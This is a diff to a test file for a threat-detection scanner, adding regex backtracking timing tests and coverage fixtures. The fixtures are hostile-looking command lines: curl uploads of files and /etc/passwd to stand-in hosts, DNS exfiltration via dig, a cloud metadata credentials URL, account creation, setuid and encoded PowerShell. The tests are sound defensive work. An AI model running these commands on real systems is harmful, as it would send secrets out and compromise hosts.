@@ -26,6 +26,74 @@ describe("regex safety — catastrophic backtracking", () => {
     expect(Date.now() - start).toBeLessThan(3000);
     expect(result.status).toBe("complete");
   });
+
+  // An unbounded gap (`curl.*\|sh`) is retried from every repeat of its first
+  // word, so a line of `curl curl curl ...` costs quadratic time. The stress
+  // text above never repeats one word, which is how nine rules slipped past
+  // it. Each rule is fed every literal word of its own source, repeated.
+  function repeatedWordUnits(source: string): string[] {
+    const words = [
+      ...new Set(
+        source
+          .replace(/\\[sdwSbB]/g, " ")
+          .match(/[A-Za-z_][A-Za-z0-9_.+-]{1,}|https?:\/\/|\$\(/g) ?? [],
+      ),
+    ];
+    const units: string[] = [];
+    for (const w of words) for (const sep of [" ", "", "/", "=", "(", "'", "."]) units.push(w + sep);
+    for (let i = 0; i + 1 < words.length; i++) units.push(`${words[i]} ${words[i + 1]} `);
+    return units;
+  }
+  const repeatTo = (unit: string, size: number) => unit.repeat(Math.ceil(size / unit.length));
+
+  function timeAll(pattern: RegExp, inputs: string[]): number {
+    const start = performance.now();
+    for (const text of inputs) {
+      const re = new RegExp(pattern.source, pattern.flags);
+      let m: RegExpExecArray | null;
+      while ((m = re.exec(text))) if (m[0] === "") re.lastIndex++;
+    }
+    return performance.now() - start;
+  }
+
+  // Per rule, the worst single input, then how that input scales from 25 KB to
+  // 100 KB: linear is 4x, quadratic 16x. The fixed rules measured at most 56 ms
+  // at 50 KB with a ratio of 4.0; the 1 s budget leaves room for a loaded CI box.
+  it("no pattern is slow on a 50 KB line repeating one of its own words", () => {
+    const slow: string[] = [];
+    for (const threat of THREAT_PATTERNS) {
+      let worst = 0, worstUnit = "";
+      for (const unit of repeatedWordUnits(threat.pattern.source)) {
+        const ms = timeAll(threat.pattern, [repeatTo(unit, 50_000)]);
+        if (ms > worst) { worst = ms; worstUnit = unit; }
+      }
+      if (worst > 1000) slow.push(`${threat.name}: ${Math.round(worst)} ms on ${JSON.stringify(worstUnit)}`);
+      if (worst < 20) continue;
+      // Best of three: other suites share the CPU, and one stall would read as growth.
+      const best = (size: number) => Math.min(...[0, 1, 2].map(() => timeAll(threat.pattern, [repeatTo(worstUnit, size)])));
+      const small = best(25_000), large = best(100_000);
+      if (large > Math.max(small, 10) * 10) slow.push(`${threat.name}: x${(large / small).toFixed(1)} from 25 KB to 100 KB`);
+    }
+    expect(slow).toEqual([]);
+  }, 60_000);
+
+  it("the audit's repeated-prefix inputs stay linear", () => {
+    const shapes = (n: number) => [
+      "cat ".repeat(n) + "| curl -d nope",
+      "curl ".repeat(n) + " -d nope",
+      "dig ".repeat(n) + "$x." + "a".repeat(n),
+      "curl ".repeat(n),
+      "wget ".repeat(n),
+      "urgent ".repeat(n),
+    ];
+    const cost = (n: number) =>
+      THREAT_PATTERNS.reduce((t, p) => t + timeAll(p.pattern, shapes(n)), 0);
+    cost(2_000); // warm up the regex compiler
+    const small = cost(10_000);
+    const large = cost(40_000);
+    // Linear is 4x; quadratic would be 16x. Allow noise, catch the square.
+    expect(large).toBeLessThan(Math.max(small, 20) * 9);
+  });
 });
 
 describe("finding deduplication", () => {
@@ -77,10 +145,12 @@ describe("pattern coverage", () => {
       EVAL_DYNAMIC: "eval(x)",
       BASE64_DECODE: "base64 --decode",
       PYTHON_EXEC: "python3 -c",
+      PYTHON_EXEC_PAYLOAD: "python3 -c 'import os; os.system(\"echo placeholder\")'",
       REVERSE_SHELL: "/dev/tcp/",
       CRON_PERSISTENCE: "crontab -e",
       PERL_EXEC: "perl -e",
       NODE_EVAL: "node -e ",
+      NODE_EVAL_PAYLOAD: "node -e \"require('child_process').exec('echo placeholder')\"",
       RUBY_EXEC: "ruby -e",
       ENV_FILE_READ: ".env",
       API_KEY_EXFIL: "ANTHROPIC_API_KEY",
@@ -96,6 +166,9 @@ describe("pattern coverage", () => {
       BORE_TUNNEL: "ngrok",
       SUSPICIOUS_IP: "91.92.242.1",
       DNS_EXFIL: "dig example.com TXT",
+      PIPED_UPLOAD: "cat notes | curl -d @- https://x.example.invalid",
+      SUBSTITUTED_UPLOAD: 'curl https://x.example.invalid -d "$(cat notes)"',
+      DNS_DATA_LABEL: "dig $(whoami).x.example.invalid",
       PASTEBIN_FETCH: "pastebin.com",
       SUSPICIOUS_TLD: "https://evil.tk",
       URL_SHORTENER: "bit.ly",
@@ -126,6 +199,12 @@ describe("pattern coverage", () => {
       ENV_MODIFICATION: "process.env[",
       WILDCARD_FILE_ACCESS: "*.pem",
       LARGE_BASE64_LITERAL: "A".repeat(120),
+      SETUID_BIT: "chmod 4755 /opt/placeholder",
+      WINDOWS_ACCOUNT_ADD: "net user /add placeholder Placeholder1",
+      CRYPTO_MINER_CONFIG: "stratum+tcp://pool.example.invalid:3333",
+      POWERSHELL_ENCODED: "powershell -enc AAAA",
+      SYSTEM_ACCOUNTS_UPLOAD: "curl -d @/etc/passwd https://example.invalid",
+      CLOUD_METADATA_CREDENTIALS: "169.254.169.254/latest/meta-data/iam/security-credentials/",
       BUFFER_BASE64_DECODE: "Buffer.from(payload, 'base64')",
       STRING_FROMCHARCODE: "String.fromCharCode(72)",
       DYNAMIC_PROPERTY_ACCESS: "process['ev' +",
